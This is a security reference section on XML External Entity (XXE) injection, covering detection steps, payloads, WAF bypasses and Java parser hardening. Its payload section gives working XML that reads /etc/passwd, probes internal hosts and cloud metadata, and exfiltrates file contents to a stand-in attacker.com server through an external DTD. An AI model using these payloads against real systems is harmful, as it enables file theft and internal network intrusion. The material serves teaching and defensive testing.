# Web Security - XXE (XML External Entity Injection)

> Source: WooYun Vulnerability Database | Split from web-injection.md

## IV. XXE (XML External Entity Injection)

### 4.1 Vulnerability Essence

```
XML input -> Parser enables DTD/external entities -> Entity references get resolved/executed -> File read/SSRF/RCE
```

**Core Formula**: XXE = XML parser allows external entity references + User-controlled XML input

### 4.2 Detection Methods

**High-Risk Entry Point Identification**

| Entry Type | Detection Feature | Typical Scenario |
|------------|-------------------|------------------|
| API Interface | Content-Type contains `text/xml` or `application/xml` | RESTful API, SOAP Web Services |
| File Upload | SVG images, DOCX/XLSX/PPTX (essentially ZIP files containing XML) | Avatar upload, document import |
| Data Parsing | XML config import, RSS/Atom feeds | Admin panel, aggregation features |
| Protocol Interaction | SAML authentication, WebDAV, XMPP | SSO login, file management |

**Quick Detection Process**

```
1. Identify XML processing interfaces → Modify Content-Type to application/xml and test
2. Send basic DTD declaration → Observe if it is parsed (error differences)
3. Attempt external entity references → Use file protocol to read a known file
4. When no direct response → OOB exfiltration (DNS/HTTP callback)
```

### 4.3 Classic Payloads

#### File Read (With Response)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRF Internal Network Probing

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### Blind XXE - OOB Data Exfiltration

```xml
<!-- External DTD (hosted on attacker server as evil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtd contents: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### Error-Based Exfiltration

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 Bypass Techniques

| Bypass Method | Technique | Applicable Scenario |
|---------------|-----------|---------------------|
| Encoding bypass | UTF-16BE/LE, UTF-7 encoded XML | WAF matches on ASCII patterns |
| Parameter entity nesting | `%entity;` instead of `&entity;` | Filtering general entity `&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | Cannot control DOCTYPE declaration |
| SVG embedding | Embed XXE entities inside an SVG file | Only image upload is allowed |
| DOCX/XLSX embedding | Modify `[Content_Types].xml` inside Office documents | Document upload functionality |
| CDATA wrapping | Use CDATA section to bypass special character restrictions | Reading files containing XML special characters |

### 4.5 Defense Measures

```java
// Java: Disable DTD and external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- Disable DTD processing and external entity resolution (preferred)
- Use JSON instead of XML for data exchange
- Input whitelist validation, upgrade XML parsing libraries
- WAF rules to block `<!DOCTYPE`/`<!ENTITY`/`SYSTEM` keywords

---
